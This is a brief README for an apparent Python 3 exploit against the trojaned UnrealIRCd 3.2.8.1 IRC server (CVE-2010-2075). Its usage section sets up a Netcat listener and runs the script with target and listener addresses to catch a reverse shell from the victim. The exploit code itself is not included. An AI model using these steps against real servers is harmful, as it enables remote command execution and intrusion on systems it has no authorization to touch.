# UnrealIRCD-3.2.8.1-Backdoor
UnrealIRCd 3.2.8.1 backdoor command execution exploit in Python 3 (CVE-2010-2075).

# Description
[UnrealIRCd](https://www.unrealircd.org/) version 3.2.8.1 contains a trojan horse which allows remote attackers to execute arbitrary commands ([CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)).

# Usage
Start a Netcat listener on the listening host:
<sup>nc -lp 4444</sup>

Execute the script, providing the following positional arguments:
<sup>python3 script.py <target> <tport> <listener> <lport></sup>
- '<target>' Target host IP address.
